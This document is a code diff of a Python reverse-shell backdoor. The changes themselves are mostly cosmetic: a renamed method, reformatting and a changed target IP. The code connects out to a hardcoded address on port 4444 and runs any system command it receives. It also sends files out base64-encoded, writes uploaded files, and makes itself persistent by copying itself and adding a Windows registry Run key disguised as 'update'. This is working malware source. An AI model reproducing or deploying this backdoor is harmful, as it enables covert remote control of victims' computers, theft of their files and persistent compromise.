@@ -1,16 +1,16 @@
 #!/usr/bin/env python
 import socket
+import subprocess
 import json
 import os
 import base64
-import subprocess
 import sys
 import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.become_persistence()
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -19,8 +19,9 @@ class Backdoor:
         if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call(
-                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
-    
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',
+                shell=True)
+
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
@@ -45,8 +46,7 @@ class Backdoor:
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
-    
-  
+
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
@@ -55,7 +55,7 @@ class Backdoor:
     def run(self):
         while True:
             command = self.reliable_receive()
-            
+
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -65,17 +65,17 @@ class Backdoor:
                 elif command[0] == "download":
                     command_result = self.read_file(command[1])
                 elif command[0] == "upload":
-                     command_result = self.write_file(command[1], command[2])
+                    command_result = self.write_file(command[1], command[2])
                 else:
-                     command_result = self.execute_system_command(command)
+                    command_result = self.execute_system_command(command)
             except Exception as e:
                 command_result = "[-] Error during command execution."
 
-
             self.reliable_send(command_result)
 
+
 try:
-    my_backdoor = Backdoor("192.168.88.148", 4444)
+    my_backdoor = Backdoor("192.168.88.129", 4444)
     my_backdoor.run()
 except Exception:
-    sys.exit()
+    sys.exit() 
